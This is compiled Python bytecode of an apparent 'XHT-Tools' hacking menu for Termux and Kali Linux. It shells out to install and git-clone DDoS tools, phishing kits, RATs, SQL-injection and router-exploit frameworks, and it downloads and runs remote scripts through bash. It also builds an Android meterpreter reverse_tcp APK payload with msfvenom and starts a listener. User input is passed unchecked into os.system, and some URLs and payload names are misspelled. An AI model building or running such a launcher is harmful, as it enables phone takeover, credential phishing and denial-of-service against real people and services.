U
    q��^X@  �                )   @   s�  d dl Z d dlZd dlZd dlmZ d dlmZmZmZ e �d� G dd� d�Z	e	d�Z
e	d�Ze	d	�Ze	d
�Ze	d�Ze	d�Ze	d�Ze	d�Ze	d�Ze	d�Ze	d�Ze
�d� ed�Zedk�
rpe�d� e�� �� Zed�Zedk�rxed�e�� e	�ddddddddd d!d"d#d$d%d&d'd(d)d*d+d,d-d.d/d0d1d2d3d4d5d6d7d8d9d:d;d<d=d>g'� ed?� e�� �� Zed@�e�� �q�edAk�r�edB�Ze �dCe � �q�edDk�r�e	�dEdFdGg� ed?� �q�edHk�r�e �d� edI�Z e �dJe  � edK� �q�edLk�rje �d� edM�Z!edN�Z"edO�Z#edP� e�$dQ� e	�dRe! dS e" dT e# dUdVe! dWe" dXg� �q�edYk�r<e�dZ� ed[�Z%e%dk�r�e �d\� e �d]� e �d^� ed?� n�e%dAk�r�e �d_� e �d`� eda� nXe%dDk�r�e �db� ed?� n:e%dYk�re �dc� ed?� ne%dHk�
rle �dd� ed?� �q�edek�r6e�dZ� edf�Z&e&dgk�rne �dh� n�e&dAk�r�e �di� n�e&dk�r�e �dj� n�e&dDk�r�e �dk� n�e&dHk�r�e �dl� nle&dYk�r�e �dm� nVe&dnk�r�e �do� n@e&dpk�re �dq� n*e&dek�re �dr� ne&dLk�
rle �ds� �q�edgk�r�e�dZ� edt�Z'e'dk�rpe �du� edv� nVe'dAk�r�e �dw� n@e'dDk�r�e �dx� n*e'dYk�r�e �dy� ne'dHk�
rle �dz� �q�edpk�r.e�dZ� ed{�Z(e(dk�re �d|� ed?� �
qle(dAk�r&e �d}� ed?� �
qle(dDk�rDe �d~� ed?� n�e(dYk�rbe �d� ed?� n�e(dHk�r�e �d�� ed?� n�e(dLk�r�e �d�� ed?� n�e(dek�r�e �d�� ed?� nne(dgk�r�e �d�� ed?� nPe(dpk�r�e �d�� ed?� n2e(dnk�re �d�� ne(d�k�
rle �d�� ed?� �q�ednk�r e�dZ� ed��Z)e)dk�rhe �d�� ed?� n�e)dAk�r�e �d�� ed?� nve)dDk�r�e �d�� ed?� nXe)dYk�r�e �d�� ed?� n:e)dHk�r�e �d�� ed?� ne)dLk�
rle �d�� ed?� �q�ed�k�r*e �d� e �d�� ed�� �q�ed�k�r�e�d�� ed��Z*e*dk�rne �d� e �d�� edv� n&e*dAk�
rle �d� e �d�� edv� �q�ed�k�r�e�dZ� ed��Z+e+dk�r�e �d� e �d�� edv� n�e+dAk�re �d� e �d�� edv� n�e+dDk�r,e �d� e �d�� edv� nve+dYk�rTe �d� e �d�� edv� nNe+dHk�r|e �d� e �d�� edv� n&e+dLk�
rle �d� e �d�� edv� �q�ed�k�r�e �d� e �d�� edv� �q�ed�k�r�e �d� e �d�� ed�� �q�ed�k�	r�e�d�� ed��Z,e,dk�	rRe �d� e �d�� e �d�� e �d�� edv� nNe,dAk�	rze �d� e �d�� edv� n&e,dDk�
rle �d� e �d�� edv� n�ed�k�
rPe�d�� ed��Z-e-dk�	r�e �d� d�Z.ee.� nne-dAk�
re �d� d�Z/ee/� nLe-dDk�
r$e �d� d�Z0ee0� n*e-dYk�
rFe �d� d�Z1ee1� ned�� ned�k�
rde2d�� ned�� �nedAk�rZd�Z3ee3� e�� �� Zed�Zedk�r2ed�e�� e	�d�d�d�d�d�d�d�d�d d�d�d�d�d�d�d(d�d�d�d�d�d�d�d�d�d�d�d�d�d�d�d:d;d�d�d�g$� e�$d� ed?� e�� �� Zed@�e�� n&ed�k�r�e �d� e �dӡ e�2�  n0edDk�r�e �d� e �dԡ e�2�  ned�� dS )��    N)�datetime)�Style�	Animation�ProFunctions�clearc                   @   s8   e Zd Zdd� Zedd� �Zdd� Zdd� Zd	d
� ZdS )�N4c                 C   s(   t � j|�d�dd� � | _tj| _d S )N�
�   �����)r   ZEqual�split�toolsr   ZSlowLine�A)�self�text� r   �hack.py�__init__	   s    zN4.__init__c                 C   s"   |D ]}t �|� t�d� qd S )Nr	   )�os�system�time�sleep)r   Zcommands�ir   r   r   �	Installer   s    
zN4.Installerc              	   C   s<   t |||d � � jddddddddgdd	dd
d��d|�S )Nr	   u   ╔u   ╢u   ╚u   ═u   ╝u   ╟u   ╗�	   �   )�SquareZcolsZspaceZ	padding_yZ	padding_xu   ══)r   r   �replace)r   r   �indexr   r   r   r   �	my_square   s    � �zN4.my_squarec                 C   s\   d}d}d}t t|��D ]>}|r<|| �||d�| 7 }d}q|| �||d�| 7 }d}q|S )N� r   Tu   ╧╤Fu   ╤╧)�range�lenr   )r   r   �Sr   Ztempr   r   r   r   �my_tool   s    z
N4.my_toolc                 C   s$   t �d� | j| �| j�dd� d S )Nr   g{�G�z�?)�t)r   r   r   r#   r   )r   Zpaddr   r   r   �Style_C1)   s    
zN4.Style_C1N)	�__name__�
__module__�__qualname__r   �classmethodr   r   r#   r%   r   r   r   r   r      s   
	r   z$
[1] Termux
[2] Kali linux
[3] Exit
ae  
[01] Basics of termux
[02] Check the open ports on the website or ip
[03] install metasploit
[04] DDOS ATTACK
[05] Scan a ip for website
[06] Payload Generator
[07] Linux on Android
[08] Fishing
[09] information Gathering
[10] Exploitation
[11] Root
[12] SQL injection
[13] Scan
[14] scan apps (android)
[15] Hash
[16] Framework
[17] information
[99] Exit
zH
[1] hulk
[2] XERXES
[3] Dost-WebServer-Tool
[4] Doosip
[5] DDos Attack
z�
[01] Kali Linux
[02] kali NetHunter
[03] parrot os
[04] Arch Linux
[05] Black Arch
[06] Alpin
[07] CentOS
[08] fedora
[09] backbox
[10] ubuntu
zF
[1] shellfish
[2] socialFish
[3] blackEye
[4] weeman
[5] V7x-Fishing
z�
[1] Red Hawk
[2] Tool-X
[3] Lazymux
[4] D-Tect
[5] IPGeoLocation
[6] infoga-collect Email info
[7] userRecon
[8] The choice
[9] Recon dog
[10] pureblood framework
[11] Darkfly
zf
[1] A-Rat exploit
[2] golden Eye
[3] Brutal
[4] TM-Venom
[5] Zarp-local network tool
[6] CMSeek Suit
z
[1] sqlmap
[2] viSQL
z_
[1] owscan
[2] CMSMap
[3] Click Jacking scanner
[4] TM-scanner
[5] SQLI Scan
[6] Routersploit
z>
[1] Gloom-framework
[2] hukku framework
[3] optiva framework
zT
[1] TOP 10 MOST FAMOUS HACKERS
[2] MOST FAMOUS HACKING GROUPS
[3] NETWORK
[4] TIPS
�   zEnter number : �1r	   zEnter your number==> zStarting in {0}zpkg update -yzpkg upgrade -yzpkg install python -yzpkg install python2 -yzpkg install nano -yzpkg install python3 -yzpkg install fish -yzpkg install git -yzpkg install perl -yzpkg install help -yzpkg install nmap -yzpkg install w3m -yzpkg install macchanger -yzpkg install wireshark -yzpkg install cmatrix -yztermux-setup-storage -yzpkg install hydra -yzpkg install figlet -yzpkg install sudo -yzpkg install zip -yzpkg install google -yzpkg install bash -yzpkg install php -yzpkg install java -yzpkg install wget -yzpkg install curlzpkg install rubyzpkg install unzipzpkg install host -yzpkg install prootzpkg install opensshzpkg install pipzpkg install pip2ztermux-chrootzpip install mechanezzpip install requesteszpkg install tar -yzpkg install vpn -yzpkg install tor -yzDone..!zFinished In {0}�2z enter a website or Host(ip) ==> znmap �3zpkg install ruby -yz,wget https://Auxilus.github.io/metasploit.shzbash metasploit.sh�5zenter a websit==> zping Zdone�6zENTER YOUR IP==> zENTER YOUR PORT==> zENTER THE NAME APK==> zplease wait..%r   z1msfvenom -p android/meterpreter/revers_tcp LHOST=z LPORT=z > R /sdcard/zPmsfconsole;use exploit/multi/handler;set payload android/meterpreter/reverse_tcpz	set lhostz	set lportZexploit�4�   zenter your number==> zapt update && apt upgradezapt install gitz(git clone https://github.com/grafov/hulkzapt install clangz/git clone https://github.com/zanyarjamal/xerxeszDone...!z2git clone https://github.com/verluchie/dost-attackz-git clone https://github.com/Jmeel/Doosip.gitz9git clone https://github.com/Stephin-Franklin/DDos-Attack�7z	enter==> �8z�pkg install wget openssl-tool proot tar -y && hash -r && wget https://raw.githubusercontent.com/EXALAB/AnLinux-Resources/master/Scripts/Installer/Fedora/fedora.sh && bash fedora.shz�pkg install wget openssl-tool proot -y && hash -r && wget https://raw.githubusercontent.com/EXALAB/AnLinux-Resources/master/Scripts/Installer/Nethunter/nethunter.sh && bash nethunter.shz�pkg install wget openssl-tool proot -y && hash -r && wget https://raw.githubusercontent.com/EXALAB/AnLinux-Resources/master/Scripts/Installer/Kali/kali.sh && bash kali.shz�pkg install wget openssl-tool proot tar -y && hash -r && wget https://raw.githubusercontent.com/Techriz/AndronixOrigin/master/Installer/Parrot/parrot.sh &&  bash parrot.shz�pacman-key --init && pacman-key --populate archlinuxarm && pacman -Sy --noconfirm curl && curl -O https://blackarch.org/strap.sh && chmod +x strap.sh && ./strap.shz�pkg install wget openssl-tool proot tar -y && hash -r && wget https://raw.githubusercontent.com/EXALAB/AnLinux-Resources/master/Scripts/Installer/Arch/armhf/arch.sh && bash arch.shZ10z�pkg install wget openssl-tool proot -y && hash -r && wget https://raw.githubusercontent.com/EXALAB/AnLinux-Resources/master/Scripts/Installer/Ubuntu/ubuntu.sh && bash ubuntu.sh�9z�pkg install wget openssl-tool proot -y && hash -r && wget https://raw.githubusercontent.com/EXALAB/AnLinux-Resources/master/Scripts/Installer/BackBox/backbox.sh && bash backbox.shz�pkg install wget openssl-tool proot tar -y && hash -r && wget https://raw.githubusercontent.com/EXALAB/AnLinux-Resources/master/Scripts/Installer/CentOS/centos.sh && bash centos.shz�pkg install wget openssl-tool proot tar -y && hash -r && wget https://raw.githubusercontent.com/EXALAB/AnLinux-Resources/master/Scripts/Installer/Alpine/alpine.sh && bash alpine.shzenter your number====> z6git clone https://github.com/thelinuxchoice/shellphishzdone..!z5git clone https://github.com/UndeadSec/SocialFish.gitz4git clone https://github.com/thelinuxchoice/blackeyez2git clone https://github.com/evait-security/weemanz3git clone https://github.com/Vairous7x/V7x-Fishing2z	Enter===>z2git clone https://github.com/Tuhinshubhra/RED_HAWKz0git clone https://github.com/Rajkumrdusad/Tool-Xz-git clone https://github.com/Gameye98/Lazymuxz;git clone https://github.com/shawarkhanethicalhacker/D-TECTz3git clone https://github.com/maldevel/IPGeoLocationz*git clone https://github.com/m4ll0k/Infogaz5git clone https://github.com/thelinuxchoice/userreconz5git clone https://github.com/thelinuxchoice/thechoicez5git clone https://github.com/UltimateHackers/ReconDogz0git clone https://github.com/cr4shcod3/purebloodZ11z5git clone https://github.com/Ranginang67/DarkFly-Toolz
enter===> z(git clone https://github.com/Xi4u7/A-Ratz-git clone https://github.com/jseidl/GoldenEyez-git clone https://github.com/Screetsec/Brutalz4git clone https://github.com/TechnicalMujeeb/tmvenomz)git clone https://githum.com/hatRiot/zarpz0git clone https://github.com/Tuhinshubhra/CMSeeKz(git clone https://github.com/termux-sudoz	Done....!Z12�   zenter your number==>z1git clone https://github.com/sqlmapproject/sqlmapz0git clone https://github.com/blackvkng/viSQL.gitZ13zEnter your number===>z,git clone https://github.com/gameye98/owscanz/git clone https://github.com/Dionach/CMSmap.gitz8git clone https://github.com/DV4inci/Clickjacking-testerz7git clone https;//github.com/TechnicalMujeeb/TM-scannerz4git clone https://github.com/thelinuxchoice/sqliscanz;git clone https://github.com/reverse-shell/routersploit.gitZ14z:git clone https://github.com/AndroBugs/AndroBugs_FrameworkZ15z+git clone https://github.com/ciku370/hasherzdone...!Z16�   zENTER==>zapt install tsuzapt install nmapz:git clone https://github.com/StreetSec/Gloom-Framework.gitz4git clone https://github.com/4shadoww/hakkuframeworkz8git clone https://github.com/joker25000/Optiva-FrameworkZ17zENTER YOUR NAMBER==>� zError :command not found!Z99zGood bye :Dz#
[1] basics of kali
               zapt-get  update -yzapt-get  upgrade -yzapt-get install python -yzapt-get  install python2 -yzapt-get install nano -yzapt-get install python3 -yzapt-get install fish -yzapt-get install git -yzapt-get install help -yzapt-get install nmap -yzapt-get install w3m -yzapt-get install macchanger -yzapt-get  install wireshark -yzapt-get install cmatrix -yzapt-get install figlet -yzapt-get install sudo -yzapt-get install zip -yzapt-get install google -yzapt-get install bash -yzapt-get install php -yzapt-get install java -yzapt-get install wget -yzapt-get install curlzapt-get install rubyzapt-get install unzipzapt-get install prootzapt-get install opensshzapt-get install pipzapt-get install pip2zapt-get install tar -yzapt-get install vpn -yzapt-get  install tor -yr   zfiglet -f big XHT-Toolszfiglet -f big XHT-Tool)4r   r   �sysr   ZN4Tools.Designr   r   r   r   r   �mainZmenuZDDOS_ATTACKZLinux_on_AndroidZFishingZinformation_GatheringZExploitationZSQL_injectionZScanZ	FrameworkZinformationr%   �input�yZnow�t1�n�print�formatr   �t2�wZWEBZHOSTZPORTZApkr   ZproZpro2�p�m�k�QZFWZRWZPRZBOOMZcomZGoZVT�exit�Errorr   r   r   r   �<module>   s�  
%		



�)

�




�







































































































































































�'








